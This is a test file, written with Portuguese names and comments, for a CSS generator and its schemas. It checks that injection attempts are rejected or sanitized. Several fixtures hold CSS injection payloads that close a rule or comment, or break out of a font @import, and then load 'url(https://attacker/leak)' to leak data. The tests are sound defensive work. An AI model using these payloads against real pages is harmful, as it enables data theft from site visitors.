import { describe, expect, it } from 'bun:test'
import { CommentCSSSchema, CSSRuleSchema, GoogleFontCSSSchema, KeyframesCSSSchema } from '#ir'
import { generateCSS } from '../css'

describe('generateCSS — defesa contra injeção (#18)', () => {
  it('aceita um único ponto e vírgula terminal digitado pela criança', () => {
    const css = generateCSS([
      {
        selector: '.alvo',
        declarations: { color: 'red;' },
      },
    ])

    expect(css).toContain('color: red;')
    expect(css).not.toContain('color: red;;')
  })

  it('descarta valor de declaração com chaves/; (não emenda uma 2ª regra)', () => {
    const css = generateCSS([
      {
        selector: '.alvo',
        declarations: {
          // Tentativa de exfil: fecha a regra e abre outra com background:url(...).
          color: 'red; } body { background:url(https://attacker/leak)',
          'font-size': '14px',
        },
      },
    ])
    // O valor malicioso é descartado por inteiro; a regra injetada não aparece.
    expect(css).not.toContain('attacker')
    expect(css).not.toContain('body {')
    // A declaração legítima sobrevive.
    expect(css).toContain('font-size: 14px;')
  })

  it('recusa por inteiro um seletor malicioso (não quebra nem mutila a estrutura)', () => {
    const css = generateCSS([
      {
        selector: '.x { } body',
        declarations: { color: 'red' },
      },
    ])
    expect(css).toBe('')
  })

  it('descarta declaração cuja CHAVE traz : ou ; (declaração-fantasma)', () => {
    const css = generateCSS([
      {
        selector: '.alvo',
        declarations: {
          // Chave maliciosa: `color:red;x` saía como `color:red;x: 1px;`,
          // injetando um `color:red` fantasma à revelia do aluno.
          'color:red;x': '1px',
          padding: '8px',
        },
      },
    ])
    // A chave inválida some por inteiro; nenhum `color:red` fantasma aparece.
    expect(css).not.toContain('color:red')
    expect(css).not.toContain('color: red')
    // A declaração legítima sobrevive.
    expect(css).toContain('padding: 8px;')
  })

  it('descarta declaração cuja CHAVE traz chaves ou quebra de linha', () => {
    const css = generateCSS([
      {
        selector: '.alvo',
        declarations: {
          'x } body { color': 'red',
          'a\nb': '2px',
          margin: '0',
        },
      },
    ])
    expect(css).not.toContain('} body {')
    expect(css).not.toContain('a\nb')
    expect(css).toContain('margin: 0;')
  })

  it('descarta passo de @keyframes cuja CHAVE é inválida', () => {
    const css = generateCSS([
      {
        type: 'keyframes',
        name: 'pulsar',
        steps: [{ at: '50%', declarations: { 'opacity;x': '1', transform: 'scale(1.1)' } }],
      },
    ])
    // A chave com `;` é descartada; a declaração legítima permanece.
    expect(css).not.toContain('opacity;x')
    expect(css).toContain('transform: scale(1.1);')
  })

  it('sanitiza nome de @keyframes e seletor de passo (não quebra a estrutura)', () => {
    const css = generateCSS([
      {
        type: 'keyframes',
        name: 'girar } body { background:url(https://attacker/leak)',
        steps: [{ at: '0% } body {', declarations: { opacity: '1; } body { color:red' } }],
      },
    ])
    // As chaves do nome/passo são removidas → a injeção `} body {` some, então
    // nenhuma regra separada é aberta (o texto restante fica contido na cabeça
    // do @keyframes/passo, sem efeito de exfiltração).
    expect(css).not.toContain('} body {')
    // O VALOR de passo malicioso (com `;`/chaves) é descartado por inteiro.
    expect(css).not.toContain('color:red')
    expect(css).not.toContain('opacity: 1')
  })

  it('não deixa o nome de uma fonte escapar do @import', () => {
    const css = generateCSS([
      {
        type: 'googleFont',
        family: 'x");body{background-image:url(https://attacker/leak)}/*',
      },
    ])

    expect(css).toBe('')
    expect(css).not.toContain('body{')
    expect(css).not.toContain('attacker')
  })

  it('não deixa o texto de um comentário encerrar o comentário CSS', () => {
    const css = generateCSS([
      {
        type: 'comment',
        text: '*/ body { background: url(https://attacker.example/x); } /*',
      },
    ])

    expect(css).toBe('')
    expect(css).not.toContain('attacker')
  })

  it('mantém comentários legítimos, inclusive em várias linhas', () => {
    expect(generateCSS([{ type: 'comment', text: 'linha 1\nlinha 2' }])).toContain(
      '/*linha 1\nlinha 2*/',
    )
  })
})

describe('CSSRuleSchema — bloqueio durável de injeção (#18)', () => {
  it('rejeita seletor com chaves', () => {
    const r = CSSRuleSchema.safeParse({
      selector: '.x { } body',
      declarations: { color: 'red' },
    })
    expect(r.success).toBe(false)
  })

  it('rejeita valor de declaração com } ou ;', () => {
    const r = CSSRuleSchema.safeParse({
      selector: '.x',
      declarations: { color: 'red; } body { background:url(https://attacker/leak)' },
    })
    expect(r.success).toBe(false)
  })

  it('aceita regra legítima', () => {
    const r = CSSRuleSchema.safeParse({
      selector: '.card:last-child',
      declarations: { color: '#22d3ee', 'background-image': 'url(https://exemplo.com/a.png)' },
    })
    expect(r.success).toBe(true)
  })

  it('rejeita nome de @keyframes e passo com chaves', () => {
    const name = KeyframesCSSSchema.safeParse({
      type: 'keyframes',
      name: 'girar } body {',
      steps: [{ at: '0%', declarations: { opacity: '1' } }],
    })
    expect(name.success).toBe(false)

    const step = KeyframesCSSSchema.safeParse({
      type: 'keyframes',
      name: 'girar',
      steps: [{ at: '0% } body {', declarations: { opacity: '1' } }],
    })
    expect(step.success).toBe(false)
  })

  it('aceita nomes humanos e rejeita sintaxe estrutural em Google Fonts', () => {
    expect(
      GoogleFontCSSSchema.safeParse({ type: 'googleFont', family: 'Press Start 2P' }).success,
    ).toBe(true)
    expect(
      GoogleFontCSSSchema.safeParse({
        type: 'googleFont',
        family: 'x");body{background:url(https://attacker/leak)}/*',
      }).success,
    ).toBe(false)
  })

  it('rejeita fechamento dentro do texto de comentário CSS', () => {
    const parsed = CommentCSSSchema.safeParse({
      type: 'comment',
      text: '*/ body { color: red } /*',
    })

    expect(parsed.success).toBe(false)
    if (!parsed.success) expect(parsed.error.issues[0]?.message).toContain('fechar o comentário')
  })

  it('aceita chave entre aspas em um seletor', () => {
    expect(
      CSSRuleSchema.safeParse({
        selector: '[data-x="}"]',
        declarations: { color: 'red' },
      }).success,
    ).toBe(true)
  })
})
